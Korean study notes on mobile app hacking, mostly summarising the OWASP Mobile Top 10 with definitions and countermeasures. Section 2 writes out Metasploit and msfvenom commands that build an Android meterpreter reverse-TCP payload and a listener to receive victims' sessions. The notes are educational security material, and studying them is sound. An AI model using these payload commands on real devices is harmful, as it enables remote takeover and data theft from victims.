1. 모바일 해킹 

 정의
 - 모바일 앱의 취약점을 공격하는 기술적인 위협으로, 모바일 앱을 크랙 하거나 패치해서 원하는 정보를 얻는 것을 말한다.
 - owasp에서 발표한 owasp mobile top 10이 있다.


2. 간단한 kali linux payload 제작
 
 Metasploit
 - ex)
 use exploit/multi/handler
 set PAYLOAD android/meterpreter_reverse_tcp (reverse를 쓴 이유는 해당 victim에게서 정보를 가져오려고 하기 때문이다 <> bind)
 set LHOST (아이피주소)
 set LPORT (포트번호)
 set ExitOnSession false
 exploit -j
 - msfvenom -p android/meterpreter_reverse_tcp lhost=아이피주소 lport=포트번호 -o 저장할 경로


3. owasp mobile top 10
 - owasp mobile top 10는 2014년에서 2016년에 갱신되었는데
 1. 약한 서버측 제어                        ->   1. 적절하지 않은 플랫폼 사용
 2. 취약한 데이터 저장소                    ->   2. 취약한 데이터 저장소
 3. 취약한 전송계층 방어                    ->   3. 취약한 통신
 4. 의도하지 않은 데이터 노출               ->   4. 취약한 인증
 5. 잘못된 권한부여 및 상승                 ->   5. 취약한 암호화
 6. 취약한 암호화                           ->   6. 취약한 권한부여
 7. 클라이언트측 인젝션                     ->   7. 취약한 코드품질
 8. 신뢰할 수 없는 입력값을 통한 보안 설정  ->   8. 코드 변조
 9. 부적절한 세션처리                       ->   9. 리버스 엔지니어링
 10. 바이너리 보호 결여                     ->   10. 불필요한 기능


4. 적절하지 않은 플랫폼 사용
 - 적절하지 않은 플랫폼 사용은 플랫폼 기능의 오용 또는 잘못된 플랫폼 보안 설정으로 인해 발생하는 문제이다.
 - 의도치 않은 요용, 일부 앱은 바르게 수행하려 하지만 실제로 구현처리의 잘못으로 인해 발생함
 - 안전한 코딩 및 설정방법은 모바일 앱 서버 측에서 사용해야 한다.
 ex)키 체인을 대신할 어플리케이션 저장소


5. 취약한 데이터 저장소
 - 안전하지 않은 데이터 저장 및 의도하지 않은 데이터의 유출
 - sql db, 로그파일, 쿠키저장소, sd카드등의 데이터 유출. 운영체제, 프레임워크, 새로운 하드웨어등의 의도하지 않은 데이터 누출
 - 모바일 앱, 플랫폼과 프레임워크의 위협이 정보 자산을 처리하고 API가 이런 자산을 다루는 방법에 대해 자세히 알아야 한다.


6. 취약한 통신
 - 악의적인 핸드 쉐이킹, 잘못된 SSL버전, 약한 협상, 민감정보의 평문통신에 대한 문제이다.
 - 민감정보를 포함하여 장치내부 또는 외부로 전송하는 것이 취약하다.
 - 데이터가 기기 자체에 로컬로 저장되는 경우가 취약한 정보문제이고 세션 세부 정보가 안전하게 전달되지만 세션 식별자 자체가 취약한 경우 통신문제가 아닌 취약한 인증문제이다.
 - 최신에는 모바일 장치의 SSL 라이브러리가 암호화하여 네트워크 트레픽을 서버로 전송 직전, 모바일 장치 내의 트래픽을 가로채 공격자가 중요한 트래픽을 도청하게 한다.
 - 모바일 앱이 민감한 정보, 세션 토큰 또는 기타 중요한 데이터를 백엔드 API 또는 웹 서비스로 전송하는 데 사용할 채널을 전송하기 위해 SSL/TLS를 적용한다.
 - 신뢰할 수 있는 CA가 서명한 인증서를 사용한다.
 ex)인증서 검사부족 : 모바일 앱은 서버가 제공한 인증서를 검사하지 못하고 모바일 앱은 서버에서 제공한 인증서를 무조건 받아들인다. 
                      이것은 모바일 앱과 엔드 포인트 간의 상호 인증 기능을 파괴한다. 따라서 모바일 앱은 TLS프로시를 통한 
                      man-in-the-middle attack에 취약한다.
    약한 핸드쉐이크 협상 : 클라이언트가 약한 암호 모음을 사용하기 위해 서버와 협상을 성공적으로 수행한다. 약한 암호 모음은 공격
                           자가 쉽게 복호화할 수 있는 취약한 암호를 발생시킨다. 이것은 모바일 앱과 엔드포인트 간 채널 기밀성을
                           위태롭게 한다. 


7. 취약한 인증
 - 최종 사용자 인증 또는 잘못된 세션 관리에 대한 문제이다.
 - 모바일 앱이 액세스 토큰을 제공하지 않고 익명으로 백엔드 API 서비스 요청을 실행할 수 있는 경우 이 어플리케이션은 안전하지 않은 인증을 받습니다.
 모바일 앱이 기기에 로컬로 비밀번호나 공유 비밀을 저장하는 경우 보안되지 않은 인증이 가장 자주 발생한다.
 - 보안대책으로는 가능하면 모든 인증요청이 서버측에서 수행되는지 확인하고 클라이언트 측 데이터 저장소가 필요한 경우 사용자의 로그인 자격 증명에서 
 안전하게 파생된 암호화 키를 사용하여 데이터를 암호화 해야한다.


8. 취약한 암호화
 - 취약한 통신에 대한 문제가 될 수 있고 취약한 데이터 사용 문제가 될 수 있는 취약한 암호화 문제이다.
 - 안전하지 않은 암호화 사용이 일반적이고 취약한 키 관리 프로세스, 커스텀 암호화 프로토콜 제작 및 사용, 취약한 알고리즘 및 미검증 알고리즘의 사용이 주된 원인이 된다.

 
9. 취약한 권한 부여
 - 사용자 인증을 하지 않은 모든 상황(ex 인증된 후, 권한이 부여되어 접근이 필요할 때, 일부 리소스 또는 서비스에 익명 접근 허용)이라면 권한 부여가 잘못된 것이 아니라 인증이 잘못된 것이다.
 - 인증과 권한 부여의 차이를 인식하는 것이 중요하며 안전하지 않은 직접 객체 참조 취약점의 존재나 숨겨진 엔드포인트, 사용자 역할 또는 권한 전송에 주의를 기울여야 한다.
 - 보안 대책은 모바일 장치 자체에서 오는 모든 역할 또는 사용 권한 정보에 의존하지 않고 백엔드 코드는 신원 정보와 함께 오는 요청과 관련 모든 수신 식별자가 들어오는 신원과 일치하는 지 독립적으로 검증해야 한다.


10. 취약한 코드품질
 - 서버 측 코딩 실수와 모바일 클라이언트의 코드 수준 구현에 대한 문제이다.
 - 버퍼 오버플로우, 포멧스트리밍 취약점등 모바일 장치에서 실행되는 일부 코드를 재작성해야 한다.
 - 단체의 모든 사람들이 동의하는 일관된 코딩 패턴을 유지하거나 읽기 수비고 문서화가 잘 된 코드를 작성하는 것이 잘못된 코드 문제를 해결할 수 있다.


11. 코드 변조
 - 어플리케이션을 모바일 장치에 설치하면, 코드 및 데이터 리소스가 해당 모바일 장치에 존재하는데 공격자는 코드를 직접 수정하거나 메모리 내용을 동적 변경, 애플리케이션이 사용하는 시스템 API를 변경 및 대체하거나, 어플리케이션의 데이터 및 자원을 수정할 수 있습니다. 이것은 공격자에게 소프트웨어의 의도된 사용을 개인적, 금전적 이득을 위해 파괴하는 직접적인 방법을 제공할 수 있다.
 - 기술적으로 모든 모바일 코드는 코드 변조에 취약하다 하지만 권한없는 코드 수정을 탐지하고 시도하는 것이 가치가 있는지 스스로에게 질문하는 것이 중요하다.
 - 모바일 앱은 컴파일 타임에 코드 무결성에 대해 알고 있거나 변경된 코드를 런타임에 감지할 수 있어야 한다. 그리고 앱이 런타임에 코드 무결성 위반에 적절하게 대응할 수 있어야 한다.


12. 리버스 엔지니어링
 - IDA Pro, Hopper, o'toole 및 기타 바이너리 검사 같은 소프트웨어는 공격자가 어플리케이션의 내부 동작을 파악 할 수 있도록 합니다. 
 - 백엔드 서버, 암호화 상수 및 암호 및 지적 재산에 대한 정보를 공개하는 것 외에도 어플리케이션의 초기 취약점을 악용하는 데 사용될 수 있습니다.
 - 리버스 엔지니어링의 잠재적인 비스니스 영향을 조사하는 것이 중요하고 난독화 할 메서드, 코드 세그먼트를 좁히거나 메서드뿐만 아니라 문자열 테이블까지 난독화하는 것이 중요하다.


13. 불필요한 기능
 - 종종 개발자는 숨겨진 백도어 기능 또는 프로덕션 환경으로 배포하지 않을 예정인 기타 내부 개발 보안 컨트롤을 포함합니다.
 - 이 취약점을 방지하는 가장 좋은 방법은 이 코드에서 잘 알고있는 보안 전문가 또는 서브젝트 전문가를 사용하여 수동으로 보안 코드를 검토하는 것이다.